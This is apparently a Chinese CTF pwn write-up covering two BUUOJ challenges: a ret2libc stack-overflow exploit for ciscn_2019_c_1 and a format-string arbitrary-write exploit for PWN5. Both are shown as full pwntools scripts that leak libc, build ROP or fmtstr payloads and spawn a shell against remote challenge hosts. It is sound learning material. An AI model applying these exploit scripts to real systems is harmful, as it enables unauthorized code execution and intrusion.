# 诗乃今天Pwn了吗


## ret2libc

题目：ciscn_2019_c_1

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

分析程序，发现`encrypt`函数存在危险函数`gets`可以造成栈溢出。程序开了NX保护，没有现成可供使用的shell代码，考虑使用ret2libc

首先使用ROPgadget找到需要的gadget:`pop rdi; ret`和`ret`

`python ROPgadget.py --binary ciscn --only "pop|ret"`

```
Gadgets information
============================================================
0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c80 : pop r14 ; pop r15 ; ret
0x0000000000400c82 : pop r15 ; ret
0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007f0 : pop rbp ; ret
0x0000000000400aec : pop rbx ; pop rbp ; ret
0x0000000000400c83 : pop rdi ; ret
0x0000000000400c81 : pop rsi ; pop r15 ; ret
0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b9 : ret
0x00000000004008ca : ret 0x2017
0x0000000000400962 : ret 0x458b
0x00000000004009c5 : ret 0xbf02

Unique gadgets found: 15
```

利用`encrypt`函数中的`puts`泄露出`puts`函数在内存中的地址，并重新调用执行`main`函数。

```python
pop_rdi_ret = 0x400c83
ret = 0x4006b9
start_addr = 0x400B28
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
p.recvuntil("choice!\n".encode())
p.sendline("1".encode())
p.recv()
payload = b"A" * 88 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
p.sendline(payload)
p.recvuntil(b'Ciphertext\n')
p.recvline()
puts_leak = u64(p.recvline()[:-1].ljust(8, b'\0'))
```

利用泄漏的地址寻找对应的`Libc`版本，并计算得到`libc`的加载地址和`system`函数、`/bin/sh`字符串对应地址，再次利用栈溢出漏洞得到shell

```python
libc = LibcSearcher('puts', puts_leak)
libcbase = puts_leak - libc.dump('puts')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
system_addr = libcbase + libc.dump('system')
payload = b"A" * 88 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
```

完整代码：

```python
from pwn import *
from LibcSearcher import *
elf = ELF("./ciscn")
p = remote("node4.buuoj.cn", 29518)
pop_rdi_ret = 0x400c83
ret = 0x4006b9
start_addr = 0x400B28
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
p.recvuntil("choice!\n".encode())
p.sendline("1".encode())
p.recv()
payload = b"A" * 88 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
p.sendline(payload)
p.recvuntil(b'Ciphertext\n')
p.recvline()
puts_leak = u64(p.recvline()[:-1].ljust(8, b'\0'))
p.recvuntil("choice!\n".encode())
p.sendline("1".encode())
p.recv()
libc = LibcSearcher('puts', puts_leak)
libcbase = puts_leak - libc.dump('puts')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')
system_addr = libcbase + libc.dump('system')
payload = b"A" * 88 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload)
p.recv()
p.sendline(b"cat flag")
print(p.recv())
```

## 格式化字符串漏洞-任意地址写入

题目：[第五空间2019 决赛]PWN5

程序逻辑为向`0x804C044`写入随机数作为密码，输入密码正确反弹shell。

存在格式化字符串漏洞`printf(buf)`。

考虑利用格式化字符串漏洞修改`0x804C044`位置的值获得shell。

首先爆破一下偏移量

```python
from pwn import *
def pwn(payload):
	p = remote("node4.buuoj.cn", 29282)
	p.recv()
	p.sendline(payload)
	return p.recv()[6:-1]
auto = FmtStr(pwn)
offset = auto.offset
```

得到`offset=10`

利用格式化字符串漏洞将`0x804C044`位置的值修改为`0xcafe`

```python
offset = 10
p = remote("node4.buuoj.cn", 29282)
p.recv()
payload = fmtstr_payload(offset, {0x804C044 : 0xcafe})
p.sendline(payload)
p.recv()
p.sendline(str(0xcafe).encode())
p.interactive()
```

完整代码：

```python
from pwn import *
def pwn(payload):
	p = remote("node4.buuoj.cn", 29282)
	p.recv()
	p.sendline(payload)
	info = p.recv()[6:-1]
	return info

auto = FmtStr(pwn)
offset = auto.offset
p = remote("node4.buuoj.cn", 29282)
p.recv()
payload = fmtstr_payload(offset, {0x804C044 : 0xcafe})
p.sendline(payload)
p.recv()
p.sendline(str(0xcafe).encode())
p.recv()
p.sendline(b"cat flag")
print(p.recv())
```

## 在学了在学了

